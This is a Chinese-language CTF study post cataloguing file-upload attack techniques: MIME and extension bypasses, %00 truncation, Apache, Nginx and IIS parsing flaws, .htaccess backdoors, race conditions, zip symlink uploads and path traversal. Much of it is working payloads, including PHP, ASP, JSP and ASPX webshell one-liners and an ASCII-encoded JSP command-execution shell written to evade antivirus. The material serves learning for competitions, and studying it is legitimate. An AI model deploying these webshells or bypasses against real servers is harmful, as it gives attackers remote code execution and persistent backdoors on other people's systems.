---
title: 文件上传
date: 2023-10-10 18:38:57
tags: ["2023"]
categories: ["Summary"]
about: 看了一个新生赛，有个二次渲染，我想说的是就我一个人是0基础是吧
---

# 前端绕过 

正常上传文件,捉取数据包修改（bp抓包改后缀）

# 后端绕过

服务器端检测的绕过

## 函数特性

move_uploaded_file函数会自动去除文件名末尾的点 和 /.

`fopen`函数特性

```
<?php
$filename='1.php/.';
$content="<?php eval($_POST[1]);?>";
$f = fopen($filename, 'w');
    fwrite($f, $content);
    fclose($f);    
?> 
#会在当前目录生成1.php,文件名为1.php.也可以
————————————————
```

##### 其它

后缀名大小写

后缀名双写

`尝试php3 phtml php3457(linux+apache+php5.6)等后缀`

检测MIME类型的,捉包改MIME类型



### 服务端检测（MINE类型检测） [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#服务端检测-mine类型检测)

> MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。

服务器代码判断$_FILES[”file“]["type"]是不是图片格式（`image/jpeg`、`image/png`、`image/gif`），如果不是，则不允许上传该文件。

绕过方法：

> 抓包后更改Content-Type为允许的类型绕过该代码限制，比如将php文件的`Content-Type:application/octet-stream`修改为`image/jpeg`、`image/png`、`image/gif`等就可以

常见MIMETYPE

> audio/mpeg -> .mp3 application/msword -> .doc application/octet-stream -> .exe application/pdf -> .pdf application/x-javascript -> .js application/x-rar -> .rar application/zip -> .zip image/gif -> .gif image/jpeg -> .jpg / .jpeg image/png -> .png text/plain -> .txt text/html -> .html video/mp4 -> .mp4

### 服务端检测（目录路径检测） [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#服务端检测-目录路径检测)

对目录路径的检测不够严谨而导致可以使用%00截断绕过进行攻击。

绕过方法:

> - 例如：/111.php%00.gif/111.gif -> /111.php

### 服务端检测（文件扩展名检测） [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#服务端检测-文件扩展名检测)

绕过方法：

> - 文件名大小写绕过，如：`*.pHp` `*.aSP`
> - 文件名双写绕过，如：`*.pphphp`
> - Unicode： 当目标存在json_decode且检查在json_decode之前,可以将php写为`\u0070hp`
> - 名单列表绕过，如：`*.asa` `*.cer`
> - 特殊文件名绕过，比如windows文件名最后不能有.或空格，可设为`*.php.`或`*.php+`
> - 0x00截断绕过，比如：`*.php(0x00).jpg` 或 `*.php%00.jpg`
> - 文件包含漏洞
> - 服务器解析漏洞
> - .htaccess文件攻击

### 文件截断绕过攻击 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#文件截断绕过攻击)

> 截断类型：PHP%00截断
>
> 截断原理：由于00代表结束符，所以会把00后面的所有字符删除
>
> 截断条件：PHP版本小于5.3.4，PHP的magic_quotes_gpc为OFF状态

绕过方法：

> - 例如上传文件shell.php，上传文件路径为/?upload=shell.php
> - 绕过：/?upload=shell.php%00.jpg -> /?upload=shell.php

### 解析漏洞攻击 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#解析漏洞攻击)

主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。

#### 目录解析 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#目录解析)

> - 形式：`www.xxx.com/xxx.asp/xxx.jpg`
> - 原理：服务器会默认把 `.asp` 和 `.asp`目录下的文件都解析成asp文件

#### 文件解析 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#文件解析)

> - 形式：`www.xxx.com/xxx.asp;.jpg`
> - 原理：服务器默认不解析`;`后面的内容，因此`xxx.asp;jpg`被解析为`xxx.asp`文件了

#### Apache解析漏洞 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#apache解析漏洞)

服务器代码中限制了某些后缀的文件不允许上传，但是有些Apache是允许解析其它后缀的，例如在httpd.conf中如果配置有如下代码，则能够解析php和phtml文件

```text
AddType application/x-httpd-php .php .phtml
```

1

常用后缀：`*.php` `*.php3` `*.php4` `*.php5` `*.phtml` `*.pht`

在Apache的解析顺序中，是从右到左开始解析文件后缀的，如果最右侧的扩展名不可识别，就继续往左判断，直到遇到可以解析的文件后缀为止。因此，例如上传的文件名为1.php.xxxx，因为后缀xxxx不可解析，所以向左解析后缀php。

> - 例如：`shell.php.qwe.asd` ->`shell.php`

#### Nginx解析漏洞 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#nginx解析漏洞)

> Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过 正则匹配设置**SCRIPT_FILENAME**。当访问`www.xxx.com/phpinfo.jpg/1.php`这个 URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成 SCRIPT_FILENAME传递给PHP CGI。
>
> 原因是开启了 fix_pathinfo 这个选项，会触发 在PHP中的如下逻辑： PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会 将phpinfo.jpg作为PHP文件来解析了。

攻击方式

> - 形式： `www.xxxx.com/UploadFiles/image/1.jpg/1.php` `www.xxxx.com/UploadFiles/image/1.jpg%00.php` `www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php`
> - 另一种方法：上传一个名字为test.jpg，然后访问`test.jpg/.php`,在这个目录下就会生成一句话木马shell.php。

#### IIS7.5解析漏洞 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#iis7-5解析漏洞)

> IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了 **cgi.fix_pathinfo**，而这并不是nginx或者iis7.5本身的漏洞。

### 竞争条件攻击 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#竞争条件攻击)

一些网站上传文件的逻辑时先允许上传任意文件，然后检查上传文件的文件是否包含WebShell脚本，如果包含则删除该文件。这里存在的问题是文件上传成功后和删除文件之间存在一个短暂的时间差（因为需要执行检查文件和删除文件的操作），攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。

攻击方法：

> - 攻击者需要先上传一个WebShell脚本1.php，1.php的内容为生成一个新的WebShell脚本shell.php，1.php写入如下代码
>
> ```text
> <?php
> 	fputs(fopen("../shell.php", "w"),'<?php @eval($_POST['cmd']); ?>');
> ?>
> ```
>
> 
>
> - 当1.php上传完成后，客户端立即访问1.php，则会在服务端当前目录下自动生成shell.php，这时攻击者就利用了时间差完成了WebShell的上传

### 双文件上传 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#双文件上传)

本意为上传两个或多个文件去突破。上传点支持多文件上传，但是却只对第一个文件做了过滤。

利用方式：

> - 在存在双文件上传漏洞的页面中，查看上传的页面。F12找到上传的post表单，action属性是指定上传检测页面，一般是写的绝对路径，比如：`xxx.asp/xxx.php`
> - 补全url：`https://www.xxx.com/xxx.php(asp)`
> - 构造本地post提交表单
>
> ```text
> <form action="https://www.xxx.com/xxx.asp(php)" method="post"
> name="form1" enctype="multipart/form‐data">
> <input name="FileName1" type="FILE" class="tx1" size="40">
> <input name="FileName2" type="FILE" class="tx1" size="40">
> <input type="submit" name="Submit" value="上传">
> </form>
> ```
>
> 利用时只需要修改action的值为指定上传页面即可
>
> - 第一个文件上传允许的文件类型（`.jpg` `.png` `.gif` 等），第二个上传文件是一句话木马或者WebShell脚本。这样就可以突破上传限制，成功上传木马到服务器。

### php3457 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#php3457)

> 该项为apache专属。关键点在`/etc/apache2/mods-available/php5.6.conf`这个文件，满足`.+\.ph(p[3457]?|t|tml)$`，都会被当作php文件解析。
>
> 在apache2目录下`grep -r x-httpd-php /etc/apache2`找到对应文件就能知道解析哪些后缀。

### .htaccess文件攻击 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#htaccess文件攻击)

> .htaccess文件(或者"分布式配置文件"）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
>
> 概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
>
> 启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。
>
> 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。

一般`.htaccess`可以用来留后门和针对黑名单绕过。在上传网站的根目录下，上传一个`.htaccess`文件即可。

绕过方法：

> - 针对黑名单绕过
>
> 创建一个txt文件，写入
>
> ```text
> AddType  application/x-httpd-php    .png
> ```
>
> 
>
> 另存为 `.htaccess` 名称，保存类型为所有文件，即可将`png`文件解析为`php`文件。
>
> - 留后门
>
> 在`.htaccess` 内写入`php`解析规则，类似于把文件名包含`s`的解析成`php`文件
>
> ```text
> <FilesMatch "s">
> SetHandler application/x-httpd-php
> </FilesMatch>
> ```
>
> 
>
> `shell.png` 就会以`php`文件执行
>
> - 利用.htaccess进行文件包含
>
> ```text
> php_value auto_prepend_file ".htaccess"
> #<?php eval($_POST[cmd]);?>
> ```
>
> 
>
> - 使用#注释使得.htaccess能够成功解析

### 服务器检测（文件内容检测） [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#服务器检测-文件内容检测)

#### 文件幻数检测（文件开头） [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#文件幻数检测-文件开头)

> 幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。

要绕过文件幻数检测就要在文件开头写上如下的值

```text
.jpg	FF D8 FF E0 00 10 4A 46 49 46
.gif	47 49 46 38 39 61
.png	89 50 4E 47
```



在文件幻数后面加上自己的WebShell代码就行

#### 文件相关信息检测 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#文件相关信息检测)

图像文件相关信息检测常用的是getimagesize()函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。

> - 例如下面结构
>
> ```text
> GIF89a
> (...some binary data for image...)
> <?php phpinfo(); ?>
> (... skipping the rest of binary data ...)
> ```
>
> 

另一种是判断是否包含`<?`或者`php`

> - 绕过`<?`：
>
>   ```text
>   <script language='php'>@eval($_POST[cmd]);</script>
>   ```
>
>   
>
> - 绕过`php`：
>
>   ```text
>   <?= @eval($_POST['cmd']);?>
>   ```
>
>   

绕过方法：

> - 对渲染/加载测试的攻击方式是代码注入绕过。使用winhex在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般为图片的注释区。
> - 对二次渲染的攻击方式就是攻击文件加载器自身。例如：
>
> ```text
> 上传文件数据不完整的gif文件 -> 触发报错imagecreatefromgif()函数
> 上传文件数据不完整的png文件 -> 触发报错imagecreatefrompng()函数
> ```
>
> 
>
> 某后台调用GD库对图像进行二次渲染的代码
>
> ```text
>  function image_gd_open($file, $extension)
>  {
>  $extension = str_replace('jpg', 'jpeg', $extension);
>  $open_func = 'imageCreateFrom'. $extension; //函数名变成imageCreateFrompng 之类
>  if (!function_exists($open_func))
>  {
>  	return FALSE;
>  }
>  return $open_func($file); //变成imagecreatefrompng('/tmp/phpimage')
>  }
> ```
>
> - 对文件加载器进行攻击，常见的就是溢出攻击。上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode，比如access/mdb溢出。

### 文件上传中的目录穿越漏洞 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#文件上传中的目录穿越漏洞)

攻击方式

> 形式：上传的文件会被解析为日志不能执行，给出了`/uploads/xxx.php`路径并且可以查询
>
> 绕过：上传文件的时候抓包，修改文件名（filename）为`./../../../../flag`，上传成功后路径变为`/uploads/./../../../../flag`即可进行目录穿越

## 攻击代码 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#攻击代码)

## 文件压缩：

软链接压缩包，然后上传到软链接下，放🐎进行攻击

```
ln -s /var/www/html web  #创建软链接文件夹
zip -y zip.zip web   #将软链接压缩生成一个zip.zip

再在web下面放一个shell.php（🐎） 
zip -y z.zip web   #再生成一个带🐎的压缩包

然后上传zip.zip，将上传路径改到可控目录/var/www/html
然后上传z.zip，即传到了，显示的网页下（var/www/html/shell.php）
蚁剑
```



### 常用攻击代码 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#常用攻击代码)

> 简单的一句话木马
>
> ```text
> <?php @eval($_POST['cmd']);?>
> ```
>
> 
>
> 绕过`<?`限制的一句话木马
>
> ```text
> <script language = 'php'>@eval($_POST[cmd]);</script>
> ```
>
> 
>
> 绕过`<?php ?>`限制的一句话木马
>
> ```text
> <?= @eval($_POST['cmd']);
> ```
>
> 
>
> asp一句话木马
>
> ```text
> <%eval(Request.Item["cmd"],”unsafe”);%>
> ```
>
> 
>
> JSP一句话木马
>
> ```text
> <%if(request.getParameter("f")!=null)(newjava.io.FileOutputStream (application.getRealPath("\\")+request.getParameter("f"))).write (request.getParameter("t").getBytes());%>
> ```
>
> JSP一句话免杀（ASCLL编码）
>
> ```text
> <%@ page contentType="text/html;charset=UTF-8"  language="java" %>
> <%
>     if(request.getParameter("cmd")!=null){
>         Class rt = Class.forName(new String(new byte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));
>         Process e = (Process) rt.getMethod(new String(new byte[] { 101, 120, 101, 99 }), String.class).invoke(rt.getMethod(new String(new byte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null), request.getParameter("cmd") );
>         java.io.InputStream in = e.getInputStream();
>         int a = -1;byte[] b = new byte[2048];out.print("<pre>");
>         while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("</pre>");
>     }
> %>
> ```
>
> ASPX一句话
>
> ```text
> <script language="C#"runat="server">WebAdmin2Y.x.y a=new WebAdmin2Y.x.y("add6bb58e139be10")</script>
> ```
>
> 1

### 其它攻击代码 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#其它攻击代码)

> 异或取反等操作写shell的php脚本、混淆木马、不死马。

## 更多参考 [#](https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#更多参考)

https://bbs.ichunqiu.com/thread-41672-1-1.html?from=sec

https://www.freebuf.com/articles/web/253698.html

https://www.freebuf.com/articles/web/179954.html